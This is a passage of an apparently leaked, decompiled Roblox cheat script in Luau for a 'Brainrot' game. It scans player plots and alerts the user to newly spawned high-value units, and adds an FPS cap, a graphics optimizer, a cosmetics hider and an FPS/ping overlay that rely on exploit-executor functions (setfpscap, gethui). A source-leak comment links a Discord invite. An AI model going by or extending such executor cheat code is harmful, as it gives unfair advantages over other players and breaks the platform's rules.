				local frame7 = Instance.new("Frame")
				frame7.Name = "TraitBadge"
				frame7.BackgroundColor3 = secretZebra.Background:Lerp(Color3.new(1, 1, 1), 0.16)
				frame7.BackgroundTransparency = 0.12
				frame7.BorderSizePixel = 0
				frame7.LayoutOrder = k
				frame7.Size = UDim2.fromOffset(26, 26)
				frame7.ZIndex = 183
				frame7.Parent = frame6
				local uiCorner5 = Instance.new("UICorner")
				uiCorner5.CornerRadius = UDim.new(0, 7)
				uiCorner5.Parent = frame7
				local uiStroke6 = Instance.new("UIStroke")
				uiStroke6.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
				uiStroke6.Color = secretZebra.Colors.Keypoints[1].Value
				uiStroke6.Thickness = 1
				uiStroke6.Transparency = 0.35
				uiStroke6.Parent = frame7
				local imageLabel = Instance.new("ImageLabel")
				imageLabel.BackgroundTransparency = 1
				imageLabel.Image = traitImage
				imageLabel.Position = UDim2.fromOffset(2, 2)
				imageLabel.Size = UDim2.fromOffset(22, 22)
				imageLabel.ZIndex = 184
				imageLabel.Parent = frame7
				continue
			end

			break
		end

		local frame7 = Instance.new("Frame")
		frame7.Name = "ShineClip"
		frame7.BackgroundTransparency = 1
		frame7.BorderSizePixel = 0
		frame7.ClipsDescendants = true
		frame7.Size = UDim2.fromScale(1, 1)
		frame7.ZIndex = 182
		frame7.Parent = frame3
		local uiCorner5 = Instance.new("UICorner")
		uiCorner5.CornerRadius = UDim.new(0, 17)
		uiCorner5.Parent = frame7
		local frame8 = Instance.new("Frame")
		frame8.Name = "Shine"
		frame8.BackgroundColor3 = Color3.new(1, 1, 1)
		frame8.BackgroundTransparency = 0.78
		frame8.BorderSizePixel = 0
		frame8.Position = UDim2.fromScale(-0.25, 0)
		frame8.Rotation = 18
		frame8.Size = UDim2.fromScale(0.13, 1.35)
		frame8.ZIndex = 182
		frame8.Parent = frame7
		local uiGradient6 = Instance.new("UIGradient")
		local numberSequence = NumberSequence.new
		local value371 = NumberSequenceKeypoint.new(0, 1)
		local value372 = NumberSequenceKeypoint.new(0.5, 0)
		local new3 = NumberSequenceKeypoint.new
		local tbl126 = { value371, value372 }

		do
			local values = table.pack(new3(1, 1))
			table.move(values, 1, values.n, 3, tbl126)
		end

		uiGradient6.Transparency = numberSequence(tbl126)
		uiGradient6.Parent = frame8
		TweenService:Create(uiScale, TweenInfo.new(0.42, Enum.EasingStyle.Back, Enum.EasingDirection.Out), { Scale = result30 }):Play()
		TweenService:Create(frame8, TweenInfo.new(1.25, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), { Position = UDim2.fromScale(1.18, -0.12) }):Play()
		func481()
		local n10 = tonumber(flag320) or 6

		pcall(function()
			game:GetService("Debris"):AddItem(frame, n10 + 1.5)
		end)

		local flag322 = false

		local function func491()
			if flag322 then
				return
			end
			flag322 = true

			for i_ = #list77, 1, -1 do
				pcall(list77[i_])
				list77[i_] = nil
			end

			pcall(function()
				tween:Cancel()
			end)

			func485(frame)

			if frame.Parent then
				pcall(function()
					frame:Destroy()
				end)
			end
		end

		task.delay(n10, function()
			local value373 = flag322
			local flag323

			if flag322 then
				flag323 = value373
			else
				flag323 = not frame3.Parent
			end

			if flag323 then
				func491()
				return
			end

			pcall(function()
				tween:Cancel()
				local tbl127 = { Scale = result30 * 0.78 }
				TweenService:Create(uiScale, TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.In), tbl127):Play()

				for _, descendant in ipairs(frame3:GetDescendants()) do
					if descendant:IsA("TextLabel") then
						TweenService:Create(descendant, TweenInfo.new(0.28), { TextTransparency = 1, BackgroundTransparency = 1 }):Play()
					elseif descendant:IsA("UIStroke") then
						TweenService:Create(descendant, TweenInfo.new(0.28), { Transparency = 1 }):Play()
					elseif descendant:IsA("ImageLabel") then
						TweenService:Create(descendant, TweenInfo.new(0.28), { ImageTransparency = 1 }):Play()
					elseif descendant:IsA("ViewportFrame") then
						TweenService:Create(descendant, TweenInfo.new(0.28), { BackgroundTransparency = 1, ImageTransparency = 1 }):Play()
					elseif descendant:IsA("Frame") then
						TweenService:Create(descendant, TweenInfo.new(0.28), { BackgroundTransparency = 1 }):Play()
					end
				end

				TweenService:Create(frame3, TweenInfo.new(0.28), { BackgroundTransparency = 1 }):Play()
			end)

			task.delay(0.34, func491)
		end)

		task.delay(n10 + 1, func491)
		return true
	end

	local function func492(flag324)
		local match, value374 = tostring(flag324 or ""):gsub("[%$,/s]", ""):gsub("%s+", ""):match("^([%d%.]+)([KkMmBbTt]?)$")
		local num50 = tonumber(match)
		if not num50 then
			return nil
		end
		return num50 * (({ K = 1000, M = 1000000, B = 1e9, T = 1e12 })[string.upper(value374)] or 1)
	end

	local function func493(num51)
		if num51 >= 1e12 then
			return string.format("$%.2fT/s", num51 / 1e12)
		end

		if num51 >= 1e9 then
			return string.format("$%.2fB/s", num51 / 1e9)
		end

		if num51 >= 1000000 then
			return string.format("$%.2fM/s", num51 / 1000000)
		end

		if num51 >= 1000 then
			return string.format("$%.1fK/s", num51 / 1000)
		end
		return string.format("$%d/s", math.floor(num51))
	end

	local function func494(instance76)
		return instance76:FindFirstChild("RootPart") or instance76.PrimaryPart or instance76:FindFirstChildWhichIsA("BasePart")
	end

	local function func495()
		local tbl128 = {}
		local debris = Workspace:FindFirstChild("Debris")
		if not debris then
			return tbl128
		end

		for _, child in ipairs(debris:GetChildren()) do
			if child:IsA("BasePart") and child.Name == "FastOverheadTemplate" then
				local animalOverhead = child:FindFirstChild("AnimalOverhead")
				local displayName = animalOverhead and animalOverhead:FindFirstChild("DisplayName")
				local generation = animalOverhead and animalOverhead:FindFirstChild("Generation")

				if displayName and displayName:IsA("TextLabel") and generation and generation:IsA("TextLabel") then
					local str37 = tostring(displayName.Text or "")
					tbl128[str37] = tbl128[str37] or {}
					tbl128[str37][#tbl128[str37] + 1] = { Position = child.Position, Value = func492(generation.Text), Overhead = animalOverhead }
				end
			end
		end

		return tbl128
	end

	local function func496(param149, num52, list78)
		local value375, value376, value377 = ipairs(list78[param149] or {})
		local n10 = 14
		local value378 = nil

		for _, value379 in value375, value376, value377 do
			local magnitude = (value379.Position - num52).Magnitude

			if magnitude < n10 then
				n10 = magnitude
				value378 = value379
			end
		end

		return value378
	end

	local function func497(instance77, flag325)
		local entry32 = byName7[instance77.Name]
		local n10 = type(entry32) == "table" and tonumber(entry32.Generation) or 0
		if n10 <= 0 then
			flag325 = flag325 and flag325.Value
			return flag325 or 0
		end
		local attribute = instance77:GetAttribute("Mutation") or instance77:GetAttribute("__mutation")
		local mutation = flag325 and flag325.Overhead:FindFirstChild("Mutation")

		if mutation and mutation:IsA("TextLabel") and mutation.Visible and mutation.Text ~= "" then
			attribute = mutation.Text
		end

		attribute = attribute and tbl118[tostring(attribute)]
		local n11 = 1

		if type(attribute) == "table" then
			n11 = 1 + (tonumber(attribute.Modifier) or 0)
		end

		local flag326 = false

		for _, child in ipairs(instance77:GetChildren()) do
			local match = child.Name:match("^_Trait%.(.+)$")
			local value380 = match and (tbl119[match] or tbl119[match:gsub("_", " ")])

			if type(value380) == "table" then
				if match == "Sleepy" or value380.Name == "Sleepy" then
					flag326 = true
				else
					n11 += tonumber(value380.MultiplierModifier) or 0
				end
			end
		end

		local num53 = math.round(n10 * n11 * (flag326 and 0.5 or 1))
		flag325 = flag325 and flag325.Value
		if flag325 and flag325 > 0 then
			return flag325
		end
		return num53
	end

	local function func498()
		local list79 = {}
		local plots = Workspace:FindFirstChild("Plots")
		if not plots then
			return list79, 0
		end
		local result31 = func495()
		local n10 = 0

		for _, child in ipairs(plots:GetChildren()) do
			for _, child2 in ipairs(child:GetChildren()) do
				if child2:IsA("Model") and byName7[child2.Name] then
					local value381 = func494(child2)

					if value381 then
						local overhead = func496(child2.Name, value381.Position, result31)
						local flag327 = func497(child2, overhead)

						if flag327 > 0 then
							local entry33 = byName7[child2.Name]
							overhead = overhead and overhead.Overhead
							local mutation = overhead and overhead:FindFirstChild("Mutation")
							local visible = mutation and mutation:IsA("TextLabel") and mutation.Visible

							if visible then
								visible = tostring(mutation.Text or "") ~= ""
							end

							if visible then
								visible = string.lower(tostring(mutation.Text or "")) ~= "normal"
							end

							local text = nil
							local flag328 = false
							local textColor3 = nil
							local flag329 = false
							local fontFace = nil
							local textStrokeColor3 = nil
							local textStrokeTransparency = nil
							local color = nil
							local rotation = nil
							local transparency = nil

							if visible then
								text = mutation.Text
								textColor3 = mutation.TextColor3
								flag329 = mutation.RichText
								fontFace = mutation.FontFace
								textStrokeColor3 = mutation.TextStrokeColor3
								textStrokeTransparency = mutation.TextStrokeTransparency
								local uiGradient = mutation:FindFirstChildWhichIsA("UIGradient")
								flag328 = true
								color = nil
								rotation = nil
								transparency = nil

								if uiGradient then
									color = uiGradient.Color
									rotation = uiGradient.Rotation
									transparency = uiGradient.Transparency
								end
							end

							local list80 = {}
							local traits = overhead and overhead:FindFirstChild("Traits")

							if traits then
								for _, child3 in ipairs(traits:GetChildren()) do
									if child3:IsA("ImageLabel") and child3.Visible and child3.Image ~= "" and #list80 < 6 then
										list80[#list80 + 1] = child3.Image
									end
								end
							end

							local rarity = type(entry33) == "table" and (entry33.Rarity or entry33.Tier or entry33.Rank) or nil

							list79[#list79 + 1] = {
								Model = child2,
								Name = child2.Name,
								Value = flag327,
								ValueText = func493(flag327),
								Rarity = rarity and tostring(rarity) or "",
								MutationVisible = flag328,
								MutationText = text and tostring(text) or nil,
								MutationColor = textColor3,
								MutationRichText = flag329,
								MutationFontFace = fontFace,
								MutationStrokeColor = textStrokeColor3,
								MutationStrokeTransparency = textStrokeTransparency,
								MutationGradientColor = color,
								MutationGradientRotation = rotation,
								MutationGradientTransparency = transparency,
								TraitImages = list80,
							}

							if n10 < flag327 then
								n10 = flag327
							end
						end
					end
				end
			end
		end

		return list79, n10
	end

	local function func499(param150, flag330)
		func487(param150, 7, flag330 or "Secret Zebra")
	end

	local function func500()
		table.clear(obj2)
		local value382, value383 = func498()

		for _, item67 in ipairs(value382) do
			obj2[item67.Model] = { FirstSeen = -math.huge, Value = item67.Value }
		end

		n8 = value383
	end

	local function func501()
		local now = os.clock()
		local value384, value385 = func498()
		local list81 = {}
		local n10 = 0

		for _, item68 in ipairs(value384) do
			local entry34 = obj2[item68.Model]
			local isNew = entry34 == nil
			local flag331 = entry34 and now - entry34.FirstSeen <= n6 and item68.Value > entry34.Value
			item68.IsNew = isNew
			item68.IsLateValue = flag331 == true

			if isNew then
				obj2[item68.Model] = { FirstSeen = now, Value = item68.Value }
			elseif entry34.Value < item68.Value then
				entry34.Value = item68.Value
			end

			if not isNew and not flag331 and item68.Value > n10 then
				n10 = item68.Value
			end
		end

		local value386 = nil

		for _, item69 in ipairs(value384) do
			if (item69.IsNew or item69.IsLateValue) and item69.Value >= n7 then
				list81[#list81 + 1] = item69

				if item69.Value > n10 and (not value386 or item69.Value > value386.Value) then
					value386 = item69
				end
			end
		end

		n8 = value385

		if flag313 and value386 then
			func499(value386)
		elseif not flag313 then
			table.sort(list81, function(param151, param152)
				return param151.Value > param152.Value
			end)

			for _, item70 in ipairs(list81) do
				func499(item70)
			end
		end
	end

	local function func502()
		flag312 = false

		if connection then
			connection:Disconnect()
			connection = nil
		end
	end

	local function func503()
		func502()
		func500()
		flag312 = true
		n9 = os.clock() + n5

		connection = RunService.Heartbeat:Connect(function()
			if not flag312 or os.clock() < n9 then
				return
			end
			n9 = os.clock() + n5
			pcall(func501)
		end)
	end

	local function func504()
		func502()

		for i_ = #list76, 1, -1 do
			local entry35 = list76[i_]

			if entry35 and entry35.Parent then
				entry35:Destroy()
			end

			list76[i_] = nil
		end

		if obj90 and obj90.Parent then
			obj90:Destroy()
		end

		obj90 = nil
		flag314 = nil
	end

	value354.Event:Connect(func504)
	chilliBrainrotNotificationRuntim.Destroying:Connect(func504)

	obj54:CreateToggle({
		Name = "Brainrot Notifications",
		Default = false,
		Callback = function(value)
			if value then
				func503()
			else
				func502()
			end
		end,
	})
end

obj54:CreateToggle({
	Name = "Only New Highest",
	Note = "Only notifies when the new Brainrot is worth more than every Brainrot already present.",
	Default = true,
	Callback = function(value)
		flag313 = value == true
	end,
})

do
	local tbl129 = {
		["K/s"] = { Min = 0, Max = 1000, Mult = 1000 },
		["M/s"] = { Min = 0, Max = 1000, Mult = 1000000 },
		["B/s"] = { Min = 1, Max = 1000, Mult = 1e9 },
		["T/s"] = { Min = 1, Max = 1000, Mult = 1e12 },
	}

	local value387 = nil
	local n10 = 1
	local str38 = "M/s"

	local function func505(flag332, flag333)
		if flag332 ~= nil then
			n10 = math.floor(tonumber(flag332) or n10)
		end

		if flag333 ~= nil then
			str38 = tostring(flag333)
		elseif value387 and value387.GetUnit then
			local unit = value387:GetUnit()

			if unit and unit ~= "" then
				str38 = tostring(unit)
			end
		end

		n7 = n10 * (tbl129[str38] or tbl129["M/s"]).Mult
	end

	local function func506(param153)
		str38 = tostring(param153)
		local ms = tbl129[str38] or tbl129["M/s"]

		if value387 and value387.SetRange then
			value387:SetRange(ms.Min, ms.Max)
			local min = value387:Get() or ms.Min
			local min2 = ms.Min
			local max = ms.Max
			local n11 = math.clamp(math.floor(min + 0.5), min2, max)

			if n11 ~= min then
				value387:Set(n11)
			else
				func505(n11, str38)
			end
		else
			func505(nil, str38)
		end
	end

	value387 = obj54:CreateSlider({
		Name = "Notification Min Value",
		Note = "Ignores newly spawned Brainrots below this generation value.",
		Min = 0,
		Max = 1000,
		Default = 0,
		AllowDecimals = false,
		Increment = 1,
		Unit = {
			Default = "M/s",
			Selector = true,
			Options = { "K/s", "M/s", "B/s", "T/s" },
			ColorEnabled = true,
			Colors = { Number = Color3.fromRGB(255, 255, 255), Suffix = Color3.fromRGB(58, 255, 55) },
			Callback = function(value)
				func506(value)
			end,
		},
		Quick = false,
		Callback = function(value)
			func505(value, nil)
		end,
	})
end

obj54:CreateInput({
	Name = "Notification Sound ID",
	Note = "Enter an audio asset ID, then press Apply Sound ID.",
	Placeholder = "rbxassetid://123456789",
	Default = "rbxassetid://110902246151945",
	MaxLength = 40,
	Callback = function(value)
		func474(value)
	end,
})

obj54:CreateButton({
	Name = "Apply Sound ID",
	ButtonText = "Apply",
	Callback = function()
		task.spawn(function()
			func475()
		end)
	end,
})

local obj94
obj94 = Misc:CreateSection({ Name = "Performance", Expanded = true })
local flag334 = false

obj94:CreateSlider({
	Name = "FPS Cap",
	Min = 30,
	Max = 1000,
	Default = 240,
	AllowDecimals = false,
	Increment = 1,
	Unit = " FPS",
	Quick = false,
	Callback = function(value)
		local n10 = math.clamp(math.floor(tonumber(value) or 240), 30, 1000)

		if type(setfpscap) == "function" then
			if pcall(setfpscap, n10) then
				flag334 = false
				return
			end
		end

		if not flag334 then
			flag334 = true
			obj1.Notify("FPS Cap Unavailable", "This environment does not support setfpscap.", 5)
		end
	end,
})

local flag335, n10, thread

do
	local n11 = 300
	flag335 = false
	n10 = 0
	thread = nil
	local list82 = {}
	local list83 = {}
	local obj3 = setmetatable({}, { __mode = "k" })
	local chilliOptimizerRuntime = CoreGui:FindFirstChild("__ChilliOptimizerRuntime")

	if chilliOptimizerRuntime then
		local cleanup = chilliOptimizerRuntime:FindFirstChild("Cleanup")

		if cleanup and cleanup:IsA("BindableEvent") then
			pcall(function()
				cleanup:Fire()
			end)
		end

		pcall(function()
			chilliOptimizerRuntime:Destroy()
		end)
	end

	local folder = Instance.new("Folder")
	folder.Name = "__ChilliOptimizerRuntime"
	folder.Archivable = false
	folder.Parent = CoreGui
	local bindableEvent = Instance.new("BindableEvent")
	bindableEvent.Name = "Cleanup"
	bindableEvent.Parent = folder

	local function func507(param154, param155, param156)
		local ok, result = pcall(param154)
		if not ok then
			return
		end
		list83[#list83 + 1] = { Setter = param155, Value = result }
		pcall(param155, param156)
	end

	local function func508(tbl130, param157, param158)
		local entry36 = obj3[tbl130]

		if not entry36 then
			entry36 = {}
			obj3[tbl130] = entry36
		end

		if entry36[param157] == nil then
			local ok, result = pcall(function()
				return tbl130[param157]
			end)

			if not ok then
				return
			end
			entry36[param157] = { Value = result }
		end

		pcall(function()
			tbl130[param157] = param158
		end)
	end

	local function func509(instance78)
		if not flag335 or not instance78.Parent then
			return
		end

		if obj[instance78] then
			return
		end

		if instance78:IsA("ParticleEmitter") then
			func508(instance78, "Enabled", false)
			func508(instance78, "Rate", 0)
		elseif instance78:IsA("Trail") or instance78:IsA("Beam") then
			func508(instance78, "Enabled", false)
		elseif instance78:IsA("PointLight") or instance78:IsA("SpotLight") or instance78:IsA("SurfaceLight") then
			func508(instance78, "Enabled", false)
			func508(instance78, "Brightness", 0)
		elseif instance78:IsA("Fire") or instance78:IsA("Smoke") or instance78:IsA("Sparkles") then
			func508(instance78, "Enabled", false)
		elseif instance78:IsA("Explosion") then
			func508(instance78, "Visible", false)
		elseif instance78:IsA("SpecialMesh") then
			func508(instance78, "TextureId", "")
		elseif instance78:IsA("Decal") or instance78:IsA("Texture") then
			if not (instance78.Name == "face" and instance78.Parent and instance78.Parent.Name == "Head") then
				func508(instance78, "Transparency", 1)
			end
		elseif instance78:IsA("BasePart") then
			func508(instance78, "CastShadow", false)
			func508(instance78, "Material", Enum.Material.Plastic)
			func508(instance78, "Reflectance", 0)
		elseif instance78:IsA("PostEffect") then
			func508(instance78, "Enabled", false)
		elseif instance78:IsA("Atmosphere") then
			func508(instance78, "Density", 0)
			func508(instance78, "Haze", 0)
			func508(instance78, "Glare", 0)
		end
	end

	local function func510()
		for _, item71 in ipairs(list82) do
			if item71.Connected then
				item71:Disconnect()
			end
		end

		table.clear(list82)
	end

	local function func511()
		local rendering = settings().Rendering
		local terrain = Workspace.Terrain

		func507(function()
			return Workspace.StreamingEnabled
		end, function(streamingEnabled)
			Workspace.StreamingEnabled = streamingEnabled
		end, true)

		func507(function()
			return Workspace.StreamingMinRadius
		end, function(streamingMinRadius)
			Workspace.StreamingMinRadius = streamingMinRadius
		end, 64)

		func507(function()
			return Workspace.StreamingTargetRadius
		end, function(streamingTargetRadius)
			Workspace.StreamingTargetRadius = streamingTargetRadius
		end, 256)

		func507(function()
			return Workspace.StreamingIntegrityMode
		end, function(streamingIntegrityMode)
			Workspace.StreamingIntegrityMode = streamingIntegrityMode
		end, Enum.StreamingIntegrityMode.MinimumRadiusPause)

		func507(function()
			return rendering.QualityLevel
		end, function(qualityLevel)
			rendering.QualityLevel = qualityLevel
		end, Enum.QualityLevel.Level01)

		func507(function()
			return rendering.MeshPartDetailLevel
		end, function(meshPartDetailLevel)
			rendering.MeshPartDetailLevel = meshPartDetailLevel
		end, Enum.MeshPartDetailLevel.Level01)

		func507(function()
			return rendering.EditQualityLevel
		end, function(editQualityLevel)
			rendering.EditQualityLevel = editQualityLevel
		end, Enum.QualityLevel.Level01)

		func507(function()
			return Lighting.GlobalShadows
		end, function(globalShadows)
			Lighting.GlobalShadows = globalShadows
		end, false)

		func507(function()
			return Lighting.FogEnd
		end, function(fogEnd)
			Lighting.FogEnd = fogEnd
		end, 9e9)

		func507(function()
			return Lighting.Technology
		end, function(technology)
			Lighting.Technology = technology
		end, Enum.Technology.Legacy)

		func507(function()
			return Lighting.EnvironmentDiffuseScale
		end, function(environmentDiffuseScale)
			Lighting.EnvironmentDiffuseScale = environmentDiffuseScale
		end, 0)

		func507(function()
			return Lighting.EnvironmentSpecularScale
		end, function(environmentSpecularScale)
			Lighting.EnvironmentSpecularScale = environmentSpecularScale
		end, 0)

		func507(function()
			return terrain.Decoration
		end, function(decoration)
			terrain.Decoration = decoration
		end, false)

		func507(function()
			return terrain.WaterWaveSize
		end, function(waterWaveSize)
			terrain.WaterWaveSize = waterWaveSize
		end, 0)

		func507(function()
			return terrain.WaterWaveSpeed
		end, function(waterWaveSpeed)
			terrain.WaterWaveSpeed = waterWaveSpeed
		end, 0)

		func507(function()
			return terrain.WaterReflectance
		end, function(waterReflectance)
			terrain.WaterReflectance = waterReflectance
		end, 0)

		func507(function()
			return terrain.WaterTransparency
		end, function(waterTransparency)
			terrain.WaterTransparency = waterTransparency
		end, 1)
	end

	local function func512(obj95, param159)
		local descendants = obj95:GetDescendants()

		for i_, descendant in ipairs(descendants) do
			if not flag335 or n10 ~= param159 then
				return false
			end
			func509(descendant)

			if i_ % n11 == 0 then
				RunService.Heartbeat:Wait()
			end
		end

		return true
	end

	local function func513()
		local n12 = 0

		for k, value388 in pairs(obj3) do
			if k.Parent then
				for k2, value389 in pairs(value388) do
					pcall(function()
						k[k2] = value389.Value
					end)
				end
			end

			obj3[k] = nil
			n12 += 1

			if n12 % n11 == 0 then
				RunService.Heartbeat:Wait()
			end
		end
	end

	local function func514()
		if not flag335 then
			return
		end
		flag335 = false
		n10 += 1
		func510()

		if thread then
			pcall(task.cancel, thread)
			thread = nil
		end

		func513()

		for i_ = #list83, 1, -1 do
			local entry37 = list83[i_]
			pcall(entry37.Setter, entry37.Value)
		end

		table.clear(list83)
	end

	local function func515()
		if flag335 then
			return
		end
		flag335 = true
		n10 += 1
		local value390 = n10
		func511()

		list82[#list82 + 1] = Workspace.DescendantAdded:Connect(function(descendant)
			if flag335 and n10 == value390 then
				task.defer(function()
					if flag335 and n10 == value390 then
						func509(descendant)
					end
				end)
			end
		end)

		list82[#list82 + 1] = Lighting.DescendantAdded:Connect(function(descendant)
			if flag335 and n10 == value390 then
				task.defer(function()
					if flag335 and n10 == value390 then
						func509(descendant)
					end
				end)
			end
		end)

		thread = task.spawn(function()
			if not func512(Workspace, value390) then
				return
			end
			func512(Lighting, value390)
		end)
	end
	--[=[ S​o​u​r​c​e​ ​L​e​a​k ]=] -- discord.gg/x7YbZeezpm

	bindableEvent.Event:Connect(func514)
	folder.Destroying:Connect(func514)

	obj94:CreateToggle({
		Name = "Optimizer",
		Default = false,
		Callback = function(value)
			if value then
				func515()
			else
				func514()
			end
		end,
	})
end

do
	local flag336 = false
	local connection2 = nil
	local connection3 = nil
	local tbl131 = {}
	local tbl132 = {}

	local function func516(instance79)
		return instance79:IsA("Accessory") or instance79:IsA("Clothing") or instance79:IsA("ShirtGraphic")
	end

	local function func517(instance80)
		if flag336 and instance80.Parent and func516(instance80) then
			pcall(function()
				instance80:Destroy()
			end)
		end
	end

	local function func518(list84)
		if not flag336 or not list84 then
			return
		end

		for _, descendant in ipairs(list84:GetDescendants()) do
			func517(descendant)
		end
	end

	local function func519(player)
		local entry38 = tbl131[player]

		if entry38 then
			entry38:Disconnect()
			tbl131[player] = nil
		end

		local entry39 = tbl132[player]

		if entry39 then
			entry39:Disconnect()
			tbl132[player] = nil
		end
	end

	local function func520(param160, param161)
		local entry40 = tbl131[param160]

		if entry40 then
			entry40:Disconnect()
		end

		tbl131[param160] = param161.DescendantAdded:Connect(function(descendant)
			if flag336 and func516(descendant) then
				task.defer(func517, descendant)
			end
		end)

		func518(param161)
	end

	local function func521(player)
		func519(player)

		tbl132[player] = player.CharacterAdded:Connect(function(character_)
			if flag336 then
				func520(player, character_)
			end
		end)

		if player.Character then
			func520(player, player.Character)
		end
	end

	local function func522()
		flag336 = false

		if connection2 then
			connection2:Disconnect()
			connection2 = nil
		end

		if connection3 then
			connection3:Disconnect()
			connection3 = nil
		end

		for k in pairs(tbl132) do
			func519(k)
		end

		for k in pairs(tbl131) do
			func519(k)
		end
	end

	local function func523()
		if flag336 then
			return
		end
		flag336 = true
		connection2 = Players.PlayerAdded:Connect(func521)
		connection3 = Players.PlayerRemoving:Connect(func519)

		for _, player in ipairs(Players:GetPlayers()) do
			func521(player)
		end
	end

	func2(func522)

	obj94:CreateToggle({
		Name = "Hide Player Cosmetics",
		Default = false,
		Callback = function(value)
			if value then
				func523()
			else
				func522()
			end
		end,
	})
end

local name
name = "ChilliFpsPingGui"
local n11
n11 = 132
local n12
n12 = 0.085
local n13
n13 = 0.2
local n14
n14 = 8
local func524, func525
local obj96 = obj7:CreateState({ Name = "FPS and Ping Position", Default = {} })

func524 = function()
	local value391 = obj96:Get()
	if type(value391) == "table" and type(value391.XOffset) == "number" and type(value391.YOffset) == "number" then
		return UDim2.new(tonumber(value391.XScale) or 0, value391.XOffset, tonumber(value391.YScale) or 0, value391.YOffset)
	end
	return UDim2.new(0, 16, 0, 16)
end

func525 = function(param162)
	obj96:Set({ XScale = param162.X.Scale, XOffset = param162.X.Offset, YScale = param162.Y.Scale, YOffset = param162.Y.Offset })
end

local color
color = Color3.fromRGB(58, 255, 55)

do
	local color2 = Color3.fromRGB(255, 214, 84)
	local color3 = Color3.fromRGB(255, 96, 96)
	local color4 = Color3.fromRGB(150, 150, 158)
	local flag337 = false
	local list85 = {}
	local screenGui = nil
	local frame = nil
	local uiScale = nil
	local value392 = nil
	local value393 = nil
	local n15 = 1
	local n16 = 0
	local n17 = 0
	local value394 = nil
	local value395 = nil
	local gothamBold = Enum.Font.GothamBold

	pcall(function()
		gothamBold = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.ExtraBold, Enum.FontStyle.Normal)
	end)

	local function func526(param163)
		if typeof(gothamBold) == "Font" then
			param163.FontFace = gothamBold
		else
			param163.Font = Enum.Font.GothamBold
		end
	end

	local function func527(param164)
		if param164 >= 100 then
			return color
		end

		if param164 >= 50 then
			return color2
		end
		return color3
	end

	local function func528(param165)
		if param165 <= 90 then
			return color
		end

		if param165 <= 180 then
			return color2
		end
		return color3
	end

	local function func529()
		if not uiScale then
			return
		end
		local currentCamera = Workspace.CurrentCamera
		currentCamera = currentCamera and currentCamera.ViewportSize or Vector2.new(1280, 720)

		if currentCamera.X < 1 then
			currentCamera = Vector2.new(1280, 720)
		end

		uiScale.Scale = math.clamp(currentCamera.X * n12 / n11, 0.7, 1.4) * n15
	end

	local function func530()
		for _, item72 in ipairs(list85) do
			pcall(function()
				item72:Disconnect()
			end)
		end

		table.clear(list85)

		if screenGui then
			pcall(function()
				screenGui:Destroy()
			end)
		end

		screenGui = nil
		frame = nil
		uiScale = nil
		value392 = nil
		value393 = nil
		value394 = nil
		value395 = nil
		n16 = 0
	end

	local function createTextLabel(parent, param166, param167, textXAlignment, textColor3)
		local textLabel = Instance.new("TextLabel")
		textLabel.BackgroundTransparency = 1
		textLabel.Position = UDim2.fromOffset(param166, 9)
		textLabel.Size = UDim2.fromOffset(param167, 16)
		textLabel.Text = ""
		textLabel.TextColor3 = textColor3
		textLabel.TextScaled = true
		textLabel.TextXAlignment = textXAlignment
		func526(textLabel)
		textLabel.Parent = parent
		return textLabel
	end

	local function func531()
		func530()
		local obj97 = CoreGui

		if type(gethui) == "function" then
			local ok, result = pcall(gethui)
			ok = ok and typeof(result) == "Instance"
			local value396 = CoreGui

			if ok then
				obj97 = result
			else
				obj97 = value396
			end
		end

		local chilliFpsPingGui = obj97:FindFirstChild("ChilliFpsPingGui")

		if chilliFpsPingGui then
			pcall(function()
				chilliFpsPingGui:Destroy()
			end)
		end

		screenGui = Instance.new("ScreenGui")
		screenGui.Name = name
		screenGui.DisplayOrder = 58
		screenGui.IgnoreGuiInset = true
		screenGui.ResetOnSpawn = false
		screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
		screenGui.Parent = obj97
		frame = Instance.new("Frame")
		frame.Active = true
		frame.AnchorPoint = Vector2.new(0, 0)
		frame.BackgroundColor3 = Color3.fromRGB(24, 24, 28)
		frame.BackgroundTransparency = 0.28
		frame.BorderSizePixel = 0
		frame.Position = func524()
		frame.Size = UDim2.fromOffset(132, 34)
		frame.Parent = screenGui
		Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 12)
		local uiStroke = Instance.new("UIStroke")
		uiStroke.Color = Color3.fromRGB(255, 255, 255)
		uiStroke.Thickness = 1
		uiStroke.Transparency = 0.9
		uiStroke.Parent = frame
		uiScale = Instance.new("UIScale")
		uiScale.Parent = frame
		func529()
		value392 = createTextLabel(frame, 12, 34, Enum.TextXAlignment.Left, color)
		createTextLabel(frame, 48, 22, Enum.TextXAlignment.Left, color4).Text = "FPS"
		local frame2 = Instance.new("Frame")
		frame2.AnchorPoint = Vector2.new(0.5, 0.5)
		frame2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
		frame2.BackgroundTransparency = 0.85
		frame2.BorderSizePixel = 0
		frame2.Position = UDim2.new(0, 74, 0.5, 0)
		frame2.Size = UDim2.fromOffset(1, 14)
		frame2.Parent = frame
		value393 = createTextLabel(frame, 82, 30, Enum.TextXAlignment.Left, color)
		createTextLabel(frame, 113, 14, Enum.TextXAlignment.Left, color4).Text = "ms"
		local currentCamera = Workspace.CurrentCamera

		if currentCamera then
			list85[#list85 + 1] = currentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(func529)
		end

		local flag338 = false
		local value397 = nil
		local vector2 = Vector2.new(0, 0)
		local position = nil

		list85[#list85 + 1] = frame.InputBegan:Connect(function(input)
			if flag338 or input.UserInputState ~= Enum.UserInputState.Begin then
				return
			end
			local userInputType4 = input.UserInputType == Enum.UserInputType.Touch
			if not (input.UserInputType == Enum.UserInputType.MouseButton1) and not userInputType4 then
				return
			end
			local vector22 = Vector2.new(input.Position.X, input.Position.Y)
			local absolutePosition = frame.AbsolutePosition
			local absoluteSize = frame.AbsoluteSize
			if vector22.X < absolutePosition.X or vector22.X > absolutePosition.X + absoluteSize.X or vector22.Y < absolutePosition.Y or vector22.Y > absolutePosition.Y + absoluteSize.Y then
				return
			end
			flag338 = true
			value397 = userInputType4 and input or nil
			vector2 = vector22
			position = frame.Position
		end)

		list85[#list85 + 1] = UserInputService.InputChanged:Connect(function(input)
			if not flag338 or not frame or not position then
				return
			end

			if not (value397 and input == value397 or not value397 and input.UserInputType == Enum.UserInputType.MouseMovement) then
				return
			end
			local n18 = Vector2.new(input.Position.X, input.Position.Y) - vector2
